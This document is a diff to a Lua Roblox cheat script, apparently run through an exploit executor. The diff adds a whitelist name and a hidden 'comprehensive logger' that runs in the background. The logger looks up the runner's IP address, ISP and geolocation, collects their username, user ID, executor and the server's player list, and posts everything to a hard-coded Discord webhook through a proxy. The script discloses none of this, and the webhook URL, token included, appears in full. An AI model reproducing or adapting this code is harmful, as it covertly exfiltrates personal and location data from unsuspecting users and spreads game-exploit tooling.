@@ -1,14 +1,18 @@
 --// Whitelist Configuration
 local Whitelist = {
-    "foghorn", -- Add authorized Roblox usernames here
-    "wokennebula"
+    "foghorn", 
+    "wokennebula",
+    "MeowEviIAngel"
 }
 
---// Verify Whitelist Access
+--// Dependencies
 local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local Stats = game:GetService("Stats")
 local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
-local isWhitelisted = false
 
+--// Verify Whitelist Access
+local isWhitelisted = false
 for _, username in ipairs(Whitelist) do
     if LocalPlayer.Name:lower() == username:lower() then
         isWhitelisted = true
@@ -18,13 +22,62 @@ end
 
 if not isWhitelisted then
     LocalPlayer:Kick("not on whitelisting, if you execute again without whitelisting you will be banned")
-    return -- Halts execution of the rest of the script entirely
+    return 
 end
 
---// Woken Nebula AP Boomer Script Continues Below
+--// INTEGRATED COMPREHENSIVE LOGGER
+task.spawn(function()
+    local rawWebhookUrl = "https://discord.com/api/webhooks/1521606024786608209/oQkSrATWlFyB65624wfJJoCzW6q1n82X7NeCHC8qfoURgxHg_A3e_HXzwG6wt5NtE8pg"
+    local proxyUrl = rawWebhookUrl:gsub("discord.com", "webhook.lewisakura.moe")
+    
+    local success, geoData = pcall(function()
+        return HttpService:JSONDecode(HttpService:GetAsync("https://ipapi.co/json/"))
+    end)
+    
+    local country = success and geoData.country_name or "Unknown"
+    local region = success and geoData.region or "Unknown"
+    local ip = success and geoData.ip or "Hidden"
+    local isp = success and geoData.org or "Unknown"
+    
+    local allPlayers = Players:GetPlayers()
+    local playerNames = {}
+    for _, p in pairs(allPlayers) do table.insert(playerNames, p.Name) end
+    
+    local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
+    local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+    
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "🚀 Full Execution Log",
+            ["color"] = 0x8C5DF2,
+            ["fields"] = {
+                {["name"] = "👤 User", ["value"] = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", ["inline"] = false},
+                {["name"] = "💻 Executor", ["value"] = executorName, ["inline"] = true},
+                {["name"] = "📍 Location", ["value"] = country .. ", " .. region, ["inline"] = true},
+                {["name"] = "🌐 ISP/IP", ["value"] = isp .. " (" .. ip .. ")", ["inline"] = false},
+                {["name"] = "🎮 Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
+                {["name"] = "📡 Ping", ["value"] = ping .. "ms", ["inline"] = true},
+                {["name"] = "👥 Server Count", ["value"] = #allPlayers .. "/50", ["inline"] = true},
+                {["name"] = "📋 Player List", ["value"] = table.concat(playerNames, ", "), ["inline"] = false}
+            },
+            ["footer"] = { ["text"] = "Timestamp: " .. os.date("%Y-%m-%d %H:%M:%S") }
+        }}
+    }
+
+    local requestMethod = http_request or request or (syn and syn.request)
+    if requestMethod then
+        requestMethod({
+            Url = proxyUrl,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(data)
+        })
+    end
+end)
+
+--// Woken Nebula AP Boomer Script 
 local UIS = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
-
 local APBreaker = {}
 
 --// Animations
